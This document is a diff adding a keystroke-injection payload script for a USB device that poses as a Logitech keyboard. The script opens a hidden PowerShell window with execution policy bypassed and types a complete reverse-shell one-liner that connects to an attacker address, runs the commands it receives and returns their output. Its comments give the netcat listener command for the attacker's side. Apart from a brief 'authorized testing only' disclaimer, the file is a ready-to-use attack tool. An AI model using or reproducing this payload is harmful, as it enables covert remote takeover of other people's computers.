@@ -1,0 +1,23 @@
+REM Title: PowerShell Reverse Shell
+REM Author: Community
+REM Target: Windows 10/11
+REM Description: Opens a PowerShell reverse shell to attacker machine
+REM EDIT LHOST AND LPORT BEFORE USE
+REM AUTHORIZED PENETRATION TESTING ONLY
+REM
+REM Setup on attacker: nc -lvnp 4444
+REM Then set LHOST and LPORT below
+REM
+ID 046D:C31C Logitech USB Keyboard
+
+DELAY 1500
+
+GUI r
+DELAY 600
+STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+
+REM CHANGE 192.168.1.100 AND 4444 TO YOUR VALUES
+STRING $LHOST="192.168.1.100"; $LPORT=4444; $client=New-Object Net.Sockets.TCPClient($LHOST,$LPORT); $stream=$client.GetStream(); [byte[]]$bytes=0..65535|%{0}; while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback=(iex $data 2>&1|Out-String); $sendback2=$sendback+"PS "+(pwd).Path+"> "; $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()
+ENTER
